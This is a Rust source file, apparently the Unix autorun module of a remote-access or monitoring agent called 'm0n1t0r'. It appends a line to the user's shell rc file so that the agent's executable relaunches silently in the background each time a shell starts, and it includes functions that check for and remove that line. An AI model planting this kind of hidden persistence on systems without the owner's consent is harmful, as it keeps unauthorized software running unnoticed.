use directories::UserDirs;
use m0n1t0r_common::{Error, Result as AppResult, util::shell::Shell};
use remoc::rtc;
use std::{env, io::SeekFrom, path::PathBuf};
use tokio::{
    fs,
    io::{AsyncReadExt, AsyncSeekExt, AsyncWriteExt},
};

pub struct AgentObj {}

impl AgentObj {
    pub fn new() -> Self {
        Self {}
    }

    fn payload(&self, exe: PathBuf) -> AppResult<String> {
        let mut payload = String::new();
        payload.push_str("\n(");
        payload.push_str(exe.to_str().ok_or(Error::InvalidParameter)?);
        payload.push_str("&> /dev/null &)");
        Ok(payload)
    }

    async fn add_internal(&self, exe: PathBuf, file: PathBuf) -> AppResult<()> {
        let payload = self.payload(exe)?;

        fs::OpenOptions::new()
            .append(true)
            .open(file)
            .await?
            .write(payload.as_bytes())
            .await?;
        Ok(())
    }

    async fn exist_internal(&self, exe: PathBuf, file: PathBuf) -> AppResult<bool> {
        let content = fs::read_to_string(file).await?;
        let payload = self.payload(exe)?;
        Ok(content.contains(&payload))
    }

    async fn remove_internal(&self, exe: PathBuf, file: PathBuf) -> AppResult<()> {
        let mut file = fs::OpenOptions::new()
            .read(true)
            .write(true)
            .open(file)
            .await?;
        let mut content = String::new();

        file.seek(SeekFrom::Start(0)).await?;
        file.read_to_string(&mut content).await?;

        let payload = self.payload(exe)?;
        let content = content.replace(&payload, "");

        file.set_len(0).await?;
        file.seek(SeekFrom::Start(0)).await?;
        file.write(content.as_bytes()).await?;

        Ok(())
    }
}

#[rtc::async_trait]
impl m0n1t0r_common::autorun::Agent for AgentObj {
    async fn exist_current_user(&self) -> AppResult<bool> {
        self.exist_internal(
            env::current_exe()?.to_path_buf(),
            UserDirs::new()
                .ok_or(Error::InvalidUserDirectory)?
                .home_dir()
                .join(Shell::new().rc_file()),
        )
        .await
    }

    async fn remove_current_user(&self) -> AppResult<()> {
        self.remove_internal(
            env::current_exe()?.to_path_buf(),
            UserDirs::new()
                .ok_or(Error::InvalidUserDirectory)?
                .home_dir()
                .join(Shell::new().rc_file()),
        )
        .await
    }

    async fn add_current_user_at(&self, exe: PathBuf) -> AppResult<()> {
        self.add_internal(
            exe,
            UserDirs::new()
                .ok_or(Error::InvalidUserDirectory)?
                .home_dir()
                .join(Shell::new().rc_file()),
        )
        .await
    }
}
